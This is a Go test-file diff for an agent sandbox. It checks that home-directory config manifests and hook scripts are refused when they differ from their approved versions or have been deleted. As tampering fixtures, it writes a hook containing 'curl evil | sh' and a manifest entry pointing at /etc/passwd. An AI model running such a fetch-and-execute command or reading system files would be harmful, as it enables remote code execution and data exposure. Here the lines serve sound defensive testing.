@@ -12,6 +12,7 @@ import (
 	"github.com/titanous/json5"
 
 	"github.com/inoio/agents-sandbox/internal/configpaths"
+	"github.com/inoio/agents-sandbox/internal/projectguard"
 	"github.com/inoio/agents-sandbox/internal/testutil"
 )
 
@@ -1362,4 +1363,73 @@ func homeContents(files map[string]HomeFile) map[string][]byte {
 		contents[path] = file.Data
 	}
 	return contents
+}
+
+// TestHomeReadsGoThroughTheApproval pins that both home reads verify the
+// approval: the config file holding the manifest and each source file.
+func TestHomeReadsGoThroughTheApproval(t *testing.T) {
+	configpaths.WithMockConfigPaths(t)
+	dir := t.TempDir()
+	config := filepath.Join(dir, "config.yaml")
+	source := filepath.Join(dir, "hook.sh")
+	manifest := "home:\n  hook.sh: hook.sh\n"
+	t.Cleanup(projectguard.Install([]string{dir}, map[string]projectguard.Approval{
+		config: projectguard.ApprovalOf([]byte(manifest)),
+		source: projectguard.ApprovalOf([]byte("echo approved\n")),
+	}))
+	testutil.WritePath(t, config, manifest)
+	testutil.WritePath(t, source, "curl evil | sh\n")
+
+	files, missing, _, err := BuildHomeFilesWithModes([]string{dir}, "/home/dev", nil)
+	if err != nil {
+		t.Fatalf("BuildHomeFilesWithModes: %v", err)
+	}
+	if len(files) != 0 || len(missing) != 1 {
+		t.Errorf("files %v, missing %v; want the changed source left out", files, missing)
+	}
+	if !errors.Is(projectguard.Violation(), projectguard.ErrNotApproved) {
+		t.Errorf("Violation() = %v, want the changed source recorded", projectguard.Violation())
+	}
+
+	testutil.WritePath(t, config, "home:\n  other.sh: /etc/passwd\n")
+	if _, _, err := ReadHomeFromConfigDir(dir); !errors.Is(err, projectguard.ErrNotApproved) {
+		t.Errorf("ReadHomeFromConfigDir = %v, want ErrNotApproved for the changed manifest", err)
+	}
+}
+
+// TestParseHomeConfigReadsTheManifestFromBytes pins that bytes read once are
+// parsed like a config file read from disk, errors included.
+func TestParseHomeConfigReadsTheManifestFromBytes(t *testing.T) {
+	manifest, present, err := ParseHomeConfig("config.yaml", []byte("home:\n  .bashrc: bashrc\n"))
+	if err != nil || !present || manifest[".bashrc"].Source != "bashrc" {
+		t.Errorf("ParseHomeConfig = %+v, %v, %v; want the .bashrc entry", manifest, present, err)
+	}
+	if _, present, err := ParseHomeConfig("config.yaml", []byte("home: [unclosed\n")); err == nil || present {
+		t.Errorf("ParseHomeConfig(unparsable) = present %v, %v; want an error", present, err)
+	}
+}
+
+// TestHomeDiscoveryRefusesApprovedFilesThatAreGone pins that deleting an
+// approved config file or home: source stops the run instead of dropping it.
+func TestHomeDiscoveryRefusesApprovedFilesThatAreGone(t *testing.T) {
+	configpaths.WithMockConfigPaths(t)
+	dir := t.TempDir()
+	config := filepath.Join(dir, "config.yaml")
+	source := filepath.Join(dir, "hook.sh")
+	manifest := "home:\n  hook.sh: {source: hook.sh, hook: startup}\n"
+	t.Cleanup(projectguard.Install([]string{dir}, map[string]projectguard.Approval{
+		config: projectguard.ApprovalOf([]byte(manifest)),
+		source: projectguard.ApprovalOf([]byte("echo approved\n")),
+	}))
+	testutil.WritePath(t, config, manifest)
+	files, _, has, err := BuildHomeFilesWithModes([]string{dir}, "/home/dev", nil)
+	if !errors.Is(err, projectguard.ErrNotApproved) || has || files != nil {
+		t.Errorf("BuildHomeFilesWithModes with the hook gone = %v, %v, %v; want only ErrNotApproved", files, has, err)
+	}
+	if err := os.Remove(config); err != nil {
+		t.Fatal(err)
+	}
+	if _, _, err := ReadHomeFromConfigDir(dir); !errors.Is(err, projectguard.ErrNotApproved) {
+		t.Errorf("ReadHomeFromConfigDir with the config gone = %v, want ErrNotApproved", err)
+	}
 }
